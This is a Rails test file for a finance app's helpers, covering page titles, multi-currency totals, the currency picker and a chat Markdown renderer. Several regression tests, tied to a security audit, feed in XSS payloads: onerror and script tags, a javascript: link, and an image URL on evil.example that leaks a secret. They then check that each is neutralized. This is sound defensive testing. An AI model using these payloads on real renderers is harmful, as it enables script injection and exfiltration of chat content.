require "test_helper"

class ApplicationHelperTest < ActionView::TestCase
  test "#title(page_title)" do
    title("Test Title")
    assert_equal "Test Title", content_for(:title)
  end

  test "#header_title(page_title)" do
    header_title("Test Header Title")
    assert_equal "Test Header Title", content_for(:header_title)
  end

  def setup
    @account1 = Account.new(currency: "USD", balance: 1)
    @account2 = Account.new(currency: "USD", balance: 2)
    @account3 = Account.new(currency: "EUR", balance: -7)
  end

  test "#totals_by_currency(collection: collection, money_method: money_method)" do
    assert_equal "$3.00", totals_by_currency(collection: [ @account1, @account2 ], money_method: :balance_money)
    assert_equal "$3.00 | -€7.00", totals_by_currency(collection: [ @account1, @account2, @account3 ], money_method: :balance_money)
    assert_equal "", totals_by_currency(collection: [], money_method: :balance_money)
    assert_equal "$0.00", totals_by_currency(collection: [ Account.new(currency: "USD", balance: 0) ], money_method: :balance_money)
    assert_equal "-$3.00 | €7.00", totals_by_currency(collection: [ @account1, @account2, @account3 ], money_method: :balance_money, negate: true)
  end

  test "#currency_picker_options_for_family returns enabled family currencies" do
    family = families(:dylan_family)
    family.update!(currency: "SGD", enabled_currencies: [ "USD" ])

    assert_equal [ "SGD", "USD" ], currency_picker_options_for_family(family)
  end

  test "#currency_picker_options_for_family keeps selected legacy currency visible" do
    family = families(:dylan_family)
    family.update!(currency: "SGD", enabled_currencies: [ "USD" ])

    assert_equal [ "SGD", "USD", "EUR" ], currency_picker_options_for_family(family, extra: "EUR")
  end

  # S1 (audit 06-H1): chat Markdown (assistant output and user messages) is
  # rendered via #markdown and marked html_safe, so it must not let through
  # script injection, event-handler XSS, javascript: URIs, or auto-loading
  # remote images that could be used to exfiltrate chat content.
  test "#markdown neutralizes raw HTML / onerror XSS payloads" do
    html = markdown("before <img src=x onerror=alert(1)> after")

    # No live tag and no live onerror attribute — the payload must survive
    # only as inert, HTML-escaped text (e.g. "&lt;img ... onerror=...&gt;"),
    # never as markup a browser would parse and execute.
    assert_no_match(/<img\b/i, html)
    assert_no_match(/<[a-z][^>]*\bonerror\s*=/i, html)
    assert_no_match(/<script/i, html)
    assert_match(/&lt;img/i, html)
  end

  test "#markdown strips script tags outright" do
    html = markdown("<script>alert(document.cookie)</script>")

    assert_no_match(/<script/i, html)
  end

  test "#markdown does not auto-load remote images (exfiltration vector)" do
    html = markdown("![leak](https://evil.example/?d=SECRET)")

    assert_no_match(/<img/i, html)
    # The URL may still appear as inert text if it does, it must not be
    # inside a src= that the browser would fetch automatically.
    assert_no_match(/src="https:\/\/evil\.example/i, html)
  end

  test "#markdown neutralizes javascript: URIs in links" do
    html = markdown("[click me](javascript:alert(1))")

    assert_no_match(/href="javascript:/i, html)
    assert_no_match(/javascript:alert/i, html)
  end

  test "#markdown still allows safe http(s) links" do
    html = markdown("[docs](https://example.com/docs)")

    assert_match(/href="https:\/\/example\.com\/docs"/, html)
  end

  test "#markdown still renders safe formatting" do
    html = markdown("**bold** and _em_ and a list:\n\n- one\n- two")

    assert_match(/<strong>bold<\/strong>/, html)
    assert_match(/<li>one<\/li>/, html)
  end
end
